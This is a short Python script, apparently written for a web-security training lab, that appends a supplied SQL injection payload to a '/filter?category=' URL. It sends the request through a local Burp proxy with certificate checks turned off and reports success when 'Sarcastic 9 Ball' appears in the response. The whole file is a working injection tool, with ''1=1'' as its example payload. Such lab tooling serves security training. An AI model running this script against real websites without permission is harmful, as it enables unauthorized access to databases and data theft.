import sys
import requests
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# if u want to use burp suite as proxy to see all requests. Default on.
use_proxy = True
proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def exploit_sql_injection(url: str, payload: str) -> bool:
    """
    Exploit SQL injection vulnerability
    :param url: target url
    :param payload: payload
    :return: True if successful, False otherwise
    """
    uri = "/filter?category="
    if use_proxy:
        request_to_server = requests.get(
            url + uri + payload, verify=False, proxies=proxy
        )
    else:
        request_to_server = requests.get(url + uri + payload)
    if "Sarcastic 9 Ball" in request_to_server.text:
        return True
    return False


def main() -> None:
    """
    Main function
    :return: None
    """
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload> ")
        print(f"[-] Example: {sys.argv[0]} www.example.com '1=1'")
        sys.exit(-1)

    if exploit_sql_injection(url, payload):
        print("[+] SQL injections successful")
    else:
        print("[-] SQL injections unsuccessful")


if __name__ == "__main__":
    main()
